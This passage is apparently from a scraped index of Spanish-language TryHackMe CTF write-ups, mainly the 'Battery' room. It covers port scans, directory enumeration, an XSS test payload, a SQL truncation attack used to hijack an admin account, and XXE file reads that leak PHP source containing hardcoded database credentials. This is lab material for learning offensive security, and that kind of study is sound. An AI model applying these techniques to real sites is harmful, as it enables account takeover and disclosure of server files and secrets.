-rw-r--r-- 1 root root 148 Aug 17 2015 .profile -r-xr--r-- 1 root root 43 Dec 30 02:26 root.txt -rw-r--r-- 1 root root 66 Dec 30 02:13 .selected_editor bash-4.3# cat root.txt flag{[... REDACTED ...]} bash-4.3# ","description":"Cyborg es una maquina de TryHackMe, encontramos un backup creado con Borg, obtuvimos la contraseña enumerando la pagina web, dentro del backup encontramos las credenciales las cuales utilizamos en SSH. Para escalar privilegios analizamos un script el cual nos permitio dar permisos SUID a bash.","id":76,"section":"posts","tags":["rustbuster","john","sudo privesc","borg backup","getopts"],"title":"TryHackMe - Cyborg","uri":"https://sckull.github.io/posts/cyborg/"},{"content":"\rBattery es una maquina de TryHackMe, encontramos correos dentro de un fichero y mediante SQL Truncation Attack obtuvimos acceso a un panel de administracion en donde explotamos una vulnerabilidad XXE por la cual obtuvimos credenciales de acceso. La mala configuracion de permisos en un script de python nos permitio escalar privilegios.\nRoom Titulo battery Descripción CTF designed by CTF lover for CTF lovers Puntos 240 Dificultad Media Maker Th3lazykid golith3r00t NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # Nmap 7.80 scan initiated Fri Jan 15 19:35:16 2021 as: nmap -p- --min-rate 1000 -o scanPorts battery.thm Nmap scan report for battery.thm (10.10.172.112) Host is up (0.34s latency). Not shown: 65380 closed ports, 153 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Fri Jan 15 19:37:22 2021 -- 1 IP address (1 host up) scanned in 125.83 seconds # Nmap 7.80 scan initiated Fri Jan 15 19:37:43 2021 as: nmap -sV -sC -p 22,80 -o servPort battery.thm Nmap scan report for battery.thm (10.10.172.112) Host is up (0.33s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 14:6b:67:4c:1e:89:eb:cd:47:a2:40:6f:5f:5c:8c:c2 (DSA) | 2048 66:42:f7:91:e4:7b:c6:7e:47:17:c6:27:a7:bc:6e:73 (RSA) | 256 a8:6a:92:ca:12:af:85:42:e4:9c:2b:0e:b5:fb:a8:8b (ECDSA) |_ 256 62:e4:a3:f6:c6:19:ad:30:0a:30:a1:eb:4a:d3:12:d3 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 15 19:38:01 2021 -- 1 IP address (1 host up) scanned in 18.13 seconds HTTP Encontramos una pagina web en el puerto 80.\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 kali@kali:~/thm/battery$ /opt/rustbuster/rustbuster dir -u http://battery.thm/ -w /usr/share/wordlists/dirb/common.txt -e php,html,txt -t 30 ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~ _ _ _ _ _ _ _ _ _ _ /\\ \\ /\\_\\ / /\\ /\\ \\ / /\\ /\\_\\ / /\\ /\\ \\ /\\ \\ /\\ \\ / \\ \\/ / / _ / / \\ \\_\\ \\ / / \\ / / / _ / / \\ \\_\\ \\ / \\ \\ / \\ \\ / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / / /\\ \\ \\ \\ \\__ /\\_\\/ / /\\ \\__ /\\__ \\ / /\\ \\ \\ / /\\ \\ \\ / / /\\ \\_\\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\ \\ \\ \\___\\ / / / / /\\ \\___\\/ /_ \\ \\ / / /\\ \\_\\ / / /\\ \\_\\ / / /_/ / /\\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ / /\\ \\_\\ \\ \\__ / / / /\\ \\ \\ \\/___/ / /\\ \\ \\/ /_/_ \\/_/ / / /_/ / / / / /__\\/ / / / / / / / \\ \\ \\ / / / \\/_/ / /\\ \\ \\___\\ / / / / / / \\ \\ \\ / / / \\/_/ /____/\\ / / /__\\/ / / / /_____/ / / / / / _ \\ \\ \\ / / / / / / \\ \\ \\__// / / / / _ \\ \\ \\ / / / / /\\____\\/ / / /_____/ / / /\\ \\ \\ / / /___/ / /_/\\__/ / / / / / / / /____\\_\\ \\ / / /___/ / /_/\\__/ / / / / / / / /______ / / /\\ \\ \\ / / / \\ \\ \\/ / /____\\/ /\\ \\/___/ / /_/ / / / /__________/ / /____\\/ /\\ \\/___/ / /_/ / / / /_______/ / / \\ \\ \\ \\/_/ \\_\\/\\/_________/ \\_____\\/ \\_\\/ \\/_____________\\/_________/ \\_____\\/ \\_\\/ \\/__________\\/_/ \\_\\/ [?] Started at\t: 2021-01-18 22:14:21 GET\t200 OK\thttp://battery.thm/ GET 200 OK http://battery.thm/acc.php GET 200 OK http://battery.thm/admin.php GET 200 OK http://battery.thm/admin.php GET 302 Found http://battery.thm/dashboard.php =\u0026gt; admin.php GET 200 OK http://battery.thm/forms.php GET 200 OK http://battery.thm/index.html GET 200 OK http://battery.thm/index.html GET 302 Found http://battery.thm/logout.php =\u0026gt; admin.php GET 200 OK http://battery.thm/register.php GET 200 OK http://battery.thm/report GET 301 Moved Permanently http://battery.thm/scripts =\u0026gt; http://battery.thm/scripts/ GET 403 Forbidden http://battery.thm/server-status GET 302 Found http://battery.thm/with.php =\u0026gt; admin.php [00:03:04] ######################################## 18444/18444 ETA: 00:00:00 req/s: 100 [?] Ended at: 2021-01-18 22:17:26 Encontramos un panel donde es posible ingresar y registrar un usuario, al registrar un usuario e ingresar vemos diferentes paginas las cuales tienen funcionalidades de retiar, depositar y transferir dinero para un usuario registrado, tambien en la pagina de inicio muestra el nombre de usuario, numero de cuenta, saldo actual y nombre del banco.\nTambien existen dos paginas en las cuales no es posible ingresar ya que es necesario privilegios de administracion, pero aun asi es posible leer \u0026ldquo;parte\u0026rdquo; del codigo fuente de una de estas paginas, al analizar vemos que realiza una \u0026ldquo;busqueda\u0026rdquo; mediante un formulario, mismo que ingresa los datos en un \u0026ldquo;template\u0026rdquo; de XML y lo envia a la misma pagina, cuando obtiene el resultado lo inserta dentro de un elemento de HTML con id errorMessage, con esto podriamos tomar la idea de un ataque XXE.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function XMLFunction(){ var xml = \u0026#39;\u0026#39; + \u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026#39; + \u0026#39;\u0026lt;root\u0026gt;\u0026#39; + \u0026#39;\u0026lt;name\u0026gt;\u0026#39; + $(\u0026#39;#name\u0026#39;).val() + \u0026#39;\u0026lt;/name\u0026gt;\u0026#39; + \u0026#39;\u0026lt;search\u0026gt;\u0026#39; + $(\u0026#39;#search\u0026#39;).val() + \u0026#39;\u0026lt;/search\u0026gt;\u0026#39; + \u0026#39;\u0026lt;/root\u0026gt;\u0026#39;; var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = function () { if(xmlhttp.readyState == 4){ console.log(xmlhttp.readyState); console.log(xmlhttp.responseText); document.getElementById(\u0026#39;errorMessage\u0026#39;).innerHTML = xmlhttp.responseText; } } xmlhttp.open(\u0026#34;POST\u0026#34;,\u0026#34;forms.php\u0026#34;,true); xmlhttp.send(xml); }; \u0026lt;/script\u0026gt; [... REDACTED ...] \u0026lt;fieldset\u0026gt; \u0026lt;p\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;Account Number\u0026lt;/label\u0026gt; \u0026lt;input id=\u0026#34;name\u0026#34; name=\u0026#34;name\u0026#34; type=\u0026#34;text\u0026#34; value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;label for=\u0026#34;search\u0026#34;\u0026gt;Remark\u0026lt;/label\u0026gt; \u0026lt;input id=\u0026#34;search\u0026#34; name=\u0026#34;search\u0026#34; type=\u0026#34;text\u0026#34; value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;button name=\u0026#34;snd\u0026#34; id=\u0026#34;Login\u0026#34; onclick=\u0026#34;XMLFunction()\u0026#34;\u0026gt;Send Message\u0026lt;/button\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/fieldset\u0026gt; XSS Con el usuario registrado encontramos un posible vulnerabilidad de XSS en el campo de Account Number de la pagina Transfer Money.\n1 \u0026lt;b onmouseover=alert(\u0026#39;Batman-no-existe!\u0026#39;)\u0026gt;Dame clic!\u0026lt;/b\u0026gt; REPORT Dentro de los directorios de la pagina encontramos un archivo ejecutable, al ejecutarlo pregunta por un usuario y contraseña. Ejecutamos strings sobre este archivo y encontramos algunos \u0026ldquo;correos\u0026rdquo; de usuarios, asi mismo utilizamos Ghidra para poder analizar el archivo, donde pudimos encontrar que es un archivo que solo contiene un menu y que no realiza ninguna de las acciones mostradas en las opciones disponibles. Tambien encontramos que el unico usuario que puede acceder a dichas opciones es guest:guest. Con esto solo pudimos obtener alguna lista de usuarios.\nbash\rc\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 kali@kali:~/thm/battery$ strings report |more [... REDACTED ...] __gmon_start__ _ITM_registerTMCloneTable u/UH []A\\A]A^A_ admin@bank.a Password Updated Successfully! Sorry you can\u0026#39;t update the password Welcome Guest ===================Available Options============== 1. Check users 2. Add user 3. Delete user 4. change password 5. Exit clear ===============List of active users================ support@bank.a contact@bank.a cyber@bank.a admins@bank.a sam@bank.a admin0@bank.a super_user@bank.a control_admin@bank.a it_admin@bank.a Welcome To ABC DEF Bank Managemet System! UserName : Password : guest Your Choice : email : not available for guest account Wrong option Wrong username or password ;*3$\u0026#34; GCC: (Debian 9.3.0-15) 9.3.0 crtstuff.c [... REDACTED ...] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 /*main*/ undefined8 main(void) { int iVar1; int local_8c; char local_88 [32]; char local_68 [32]; undefined local_48 [32]; undefined local_28 [32]; local_8c = 0; puts(\u0026#34;\\n\\n\\n\u0026#34;); puts(\u0026#34;Welcome To ABC DEF Bank Managemet System!\\n\\n\u0026#34;); printf(\u0026#34;UserName : \u0026#34;); __isoc99_scanf(\u0026amp;DAT_001021f0,local_68); puts(\u0026#34;\\n\u0026#34;); printf(\u0026#34;Password : \u0026#34;); __isoc99_scanf(\u0026amp;DAT_001021f0,local_88); iVar1 = strcmp(local_68,\u0026#34;guest\u0026#34;); if ((iVar1 == 0) \u0026amp;\u0026amp; (iVar1 = strcmp(local_88,\u0026#34;guest\u0026#34;), iVar1 == 0)) { options(); while (local_8c != 5) { printf(\u0026#34;Your Choice : \u0026#34;); __isoc99_scanf(\u0026amp;DAT_00102216,\u0026amp;local_8c); if (local_8c == 1) { users(); } else { if (local_8c == 4) { printf(\u0026#34;email : \u0026#34;); __isoc99_scanf(\u0026amp;DAT_001021f0,local_28); puts(\u0026#34;\\n\u0026#34;); printf(\u0026#34;Password : \u0026#34;); __isoc99_scanf(\u0026amp;DAT_001021f0,local_48); update(local_28,local_48,local_48); } else { if ((local_8c == 3) || (local_8c == 2)) { puts(\u0026#34;not available for guest account\\n\u0026#34;); system(\u0026#34;clear\u0026#34;); options(); } else { puts(\u0026#34;Wrong option\\n\u0026#34;); system(\u0026#34;clear\u0026#34;); options(); } } } } } else { printf(\u0026#34;Wrong username or password\u0026#34;); } return 0; } /*update*/ void update(char *pcParm1) { int iVar1; iVar1 = strcmp(pcParm1,\u0026#34;admin@bank.a\u0026#34;); if (iVar1 == 0) { puts(\u0026#34;Password Updated Successfully!\\n\u0026#34;); options(); } else { puts(\u0026#34;Sorry you can\\\u0026#39;t update the password\\n\u0026#34;); options(); } return; } /*users*/ void users(void) { system(\u0026#34;clear\u0026#34;); puts(\u0026#34;\\n===============List of active users================\u0026#34;); puts(\u0026#34;support@bank.a\u0026#34;); puts(\u0026#34;contact@bank.a\u0026#34;); puts(\u0026#34;cyber@bank.a\u0026#34;); puts(\u0026#34;admins@bank.a\u0026#34;); puts(\u0026#34;sam@bank.a\u0026#34;); puts(\u0026#34;admin0@bank.a\u0026#34;); puts(\u0026#34;super_user@bank.a\u0026#34;); puts(\u0026#34;admin@bank.a\u0026#34;); puts(\u0026#34;control_admin@bank.a\u0026#34;); puts(\u0026#34;it_admin@bank.a\\n\\n\u0026#34;); options(); return; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 kali@kali:~/thm/battery$ ./report Welcome To ABC DEF Bank Managemet System! UserName : guest Password : guest Welcome Guest ===================Available Options============== 1. Check users 2. Add user 3. Delete user 4. change password 5. Exit Your Choice : 1 ===============List of active users================ support@bank.a contact@bank.a cyber@bank.a admins@bank.a sam@bank.a admin0@bank.a super_user@bank.a admin@bank.a control_admin@bank.a it_admin@bank.a Welcome Guest ===================Available Options============== 1. Check users 2. Add user 3. Delete user 4. change password 5. Exit Your Choice : Intentamos realizar inyeccion de SQL en todos los campos disponibles dentro de la pagina pero no logramos obtener ningun error o informacion. Aunque todavía teniamos una lista de posibles \u0026ldquo;usuarios\u0026rdquo; y \u0026ldquo;correos\u0026rdquo; los cuales podriamos registrar, obtener información o como ultimo recurso realizar un ataque de fuerza bruta al panel o al servicio SSH con hydra. Intentamos registrar solo los usuarios pero al ingresar en cada uno de ellos no logramos acceder a las paginas \u0026ldquo;administrativas\u0026rdquo;, tambien registrar los \u0026ldquo;correos\u0026rdquo; pero encontramos un problema, un \u0026ldquo;limite\u0026rdquo; el formulario de registro, especificamente el campo Username que esta limitado a un maximo de 12 caracteres, y los unicos usuarios que encontramos con ese numero de caracteres son cyber@bank.a, admin@bank.a.\nhtml\rbash\r1 2 3 4 5 6 7 \u0026lt;form method=\u0026#34;POST\u0026#34; style=\u0026#34;text-align:center\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;uname\u0026#34; placeholder=\u0026#34;Username\u0026#34; maxlength=\u0026#34;12\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;bank\u0026#34; placeholder=\u0026#34;Bank name (ABC or DEF)\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Register me!\u0026#34; name=\u0026#34;btn\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;admin.php\u0026#34;\u0026gt;Login\u0026lt;/a\u0026gt; \u0026lt;/form\u0026gt; 1 2 3 4 kali@kali:~/thm/battery$ grep -E \u0026#34;^.{11,12}$\u0026#34; users.txt cyber@bank.a admin@bank.a kali@kali:~/thm/battery$ SQL Truncation Attack En el caso de cyber@bank.a logramos registrarlo pero no obtener acceso, con admin@bank.a encontramos que el usuario ya estaba registrado, sabiendo esto buscamos alguna vulnerabilidad con la cual pudieramos cambiar de alguna forma la contraseña de este usuario, logramos encontrar un tipo de ataque con el cual es posible \u0026ldquo;registar\u0026rdquo; y con esto cambiar la contraseña de un usuario, ya que la aplicacion utiliza MySQL con su configuracion por default: SQL Truncation Attack\nRegistramos el usuario admin@bank.a y le agregamos espacios y una palabra o caracter cualquiera al final, con los campos solicitados, lo que nos permitio registrar el usuario y cambiar su contraseña.\nIngresamos con usuario y contraseña registrada y pudimos obtener acceso a las paginas \u0026ldquo;administrativas\u0026rdquo;.\nXXE Como bien se menciono anteriormente que posiblemente existia una vulnerabilidad XXE en la pagina command ya que esta envia los parametros number account (\u0026lt;name\u0026gt;\u0026lt;/name\u0026gt;) y remark (\u0026lt;search\u0026gt;\u0026lt;/search\u0026gt;) dentro de una estructura o template XML. Realizamos una \u0026ldquo;busqueda\u0026rdquo; y la respuesta de esta fue insertada en la pagina, pero la respuesta pertenece a remark por lo que seguramente podriamos intentar realizar una lectura de un archivo e \u0026ldquo;insertarlo\u0026rdquo; en la etiqueta/elemento remark (\u0026lt;search\u0026gt;\u0026lt;/search\u0026gt;) para que se muestre en la pagina.\n1 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;root\u0026gt;\u0026lt;name\u0026gt;22\u0026lt;/name\u0026gt;\u0026lt;search\u0026gt;Batman\u0026lt;/search\u0026gt;\u0026lt;/root\u0026gt; Utilizamos la estructura XML existente junto con el payload de lectura para le archivo /etc/passwd, el cual se mostró en la pagina. Dentro de la respuesta de este archivo pudimos observar que existen dos usuarios: cyber y yash.\nLuego de esto intenamos realizar una enumeracion utilizando el mismo payload para leer archivos dentro de la maquina, lo cual fue imposible para algunos archivos por lo que utilizamos un Wrapper dentro de nuestra estrucutra para poder obtener en base64 el archivo solicitado. Dentro del codigo fuente de las paginas encontramos credenciales comentadas para el usuario cyber y para la base de datos.\nphp\rphp\rphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;style\u0026gt; [... REDACTED ...] \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;dashboard.php\u0026#34;\u0026gt;Dashboard\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;with.php\u0026#34;\u0026gt;Withdraw Money\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;depo.php\u0026#34;\u0026gt;Deposit Money\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;tra.php\u0026#34;\u0026gt;Transfer Money\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;acc.php\u0026#34;\u0026gt;My Account\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;forms.php\u0026#34;\u0026gt;command\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;logout.php\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li style=\u0026#34;float:right\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;contact.php\u0026#34;\u0026gt;Contact Us\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php session_start(); if(isset($_SESSION[\u0026#39;favcolor\u0026#39;]) and $_SESSION[\u0026#39;favcolor\u0026#39;]===\u0026#34;admin@bank.a\u0026#34;) { echo \u0026#34;\u0026lt;h3 style=\u0026#39;text-align:center;\u0026#39;\u0026gt;Weclome to Account control panel\u0026lt;/h3\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;form method=\u0026#39;POST\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;input type=\u0026#39;text\u0026#39; placeholder=\u0026#39;Account number\u0026#39; name=\u0026#39;acno\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;input type=\u0026#39;text\u0026#39; placeholder=\u0026#39;Message\u0026#39; name=\u0026#39;msg\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;input type=\u0026#39;submit\u0026#39; value=\u0026#39;Send\u0026#39; name=\u0026#39;btn\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/form\u0026gt;\u0026#34;; //MY CREDS :- cyber:[... REDACTED ...] if(isset($_POST[\u0026#39;btn\u0026#39;])) { $ms=$_POST[\u0026#39;msg\u0026#39;]; echo \u0026#34;ms:\u0026#34;.$ms; if($ms===\u0026#34;id\u0026#34;) { system($ms); } else if($ms===\u0026#34;whoami\u0026#34;) { system($ms); } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;RCE Detected!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; session_destroy(); unset($_SESSION[\u0026#39;favcolor\u0026#39;]); header(\u0026#34;Refresh: 0.1; url=index.html\u0026#34;); } } } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Only Admins can access this page!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; session_destroy(); unset($_SESSION[\u0026#39;favcolor\u0026#39;]); header(\u0026#34;Refresh: 0.1; url=index.html\u0026#34;); } ?\u0026gt; ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 \u0026lt;html\u0026gt; \u0026lt;title\u0026gt;Login\u0026lt;/title\u0026gt; \u0026lt;body style=\u0026#34;background-color:black\u0026#34;\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;h3 style=\u0026#34;color:red;text-align:center\u0026#34;\u0026gt;Bank Of Abc Def User Login\u0026lt;/h3\u0026gt; \u0026lt;br\u0026gt; \u0026lt;style\u0026gt; form{ border: 2px solid black; outline: #4CAF50 solid 3px; margin: auto; width:180px; padding: 20px; text-align: center; } \u0026lt;/style\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; style=\u0026#34;text-align:center\u0026#34; name=\u0026#34;myForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;uname\u0026#34; placeholder=\u0026#34;Username\u0026#34; maxlength=\u0026#34;14\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34; name=\u0026#34;btn\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;register.php\u0026#34;\u0026gt;New user?register here.\u0026lt;/a\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php error_reporting(0); session_start(); if(isset($_POST[\u0026#39;btn\u0026#39;])) { $id=$_POST[\u0026#39;uname\u0026#39;]; $pass=$_POST[\u0026#39;password\u0026#39;]; try { $dbh = new PDO(\u0026#39;mysql:host=127.0.0.1;dbname=details\u0026#39;, \u0026#39;root\u0026#39;, \u0026#39;idkpass\u0026#39;); $dbh-\u0026gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); } catch(PDOException $ex){ echo \u0026#39;Execute Failed: \u0026#39;.$ex-\u0026gt;getMessage(); } $q = \u0026#34;SELECT username,password,cno,bank_name,amount FROM users WHERE username = :id and password= :pass\u0026#34;; $sth = $dbh-\u0026gt;prepare($q); $sth-\u0026gt;bindParam(\u0026#39;:id\u0026#39;, $id); $sth-\u0026gt;bindParam(\u0026#39;:pass\u0026#39;,$pass); $sth-\u0026gt;execute(); $result = $sth-\u0026gt;fetchAll(); if($result) { foreach($result as $row) { if ($row[\u0026#39;username\u0026#39;]!==\u0026#39;\u0026#39;) { if ($row[\u0026#39;password\u0026#39;]!==\u0026#39;\u0026#39;) { $_SESSION[\u0026#39;favcolor\u0026#39;] = $row[\u0026#39;username\u0026#39;]; $_SESSION[\u0026#39;cnum\u0026#39;] = $row[\u0026#39;cno\u0026#39;]; $_SESSION[\u0026#39;bkname\u0026#39;] = $row[\u0026#39;bank_name\u0026#39;]; $_SESSION[\u0026#39;amont\u0026#39;] = $row[\u0026#39;amount\u0026#39;]; header(\u0026#34;Location: dashboard.php\u0026#34;); } } } } else { //A note from Admin of Bank Of CC : I have saved my credentials in a file , let\u0026#39;s see if you can find it ;) echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;umm...something bad happened\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; } } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 \u0026lt;html\u0026gt; \u0026lt;style\u0026gt; [... REDACTED ...] \u0026lt;/style\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;scripts/jquery.min.js\u0026#34;\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function XMLFunction(){ var xml = \u0026#39;\u0026#39; + \u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026#39; + \u0026#39;\u0026lt;root\u0026gt;\u0026#39; + \u0026#39;\u0026lt;name\u0026gt;\u0026#39; + $(\u0026#39;#name\u0026#39;).val() + \u0026#39;\u0026lt;/name\u0026gt;\u0026#39; + \u0026#39;\u0026lt;search\u0026gt;\u0026#39; + $(\u0026#39;#search\u0026#39;).val() + \u0026#39;\u0026lt;/search\u0026gt;\u0026#39; + \u0026#39;\u0026lt;/root\u0026gt;\u0026#39;; var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = function () { if(xmlhttp.readyState == 4){ console.log(xmlhttp.readyState); console.log(xmlhttp.responseText); document.getElementById(\u0026#39;errorMessage\u0026#39;).innerHTML = xmlhttp.responseText; } } xmlhttp.open(\u0026#34;POST\u0026#34;,\u0026#34;forms.php\u0026#34;,true); xmlhttp.send(xml); }; \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;dashboard.php\u0026#34;\u0026gt;Dashboard\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;with.php\u0026#34;\u0026gt;Withdraw Money\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;depo.php\u0026#34;\u0026gt;Deposit Money\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;tra.php\u0026#34;\u0026gt;Transfer Money\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;acc.php\u0026#34;\u0026gt;My Account\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;forms.php\u0026#34;\u0026gt;command\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;logout.php\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li style=\u0026#34;float:right\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;contact.php\u0026#34;\u0026gt;Contact Us\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; 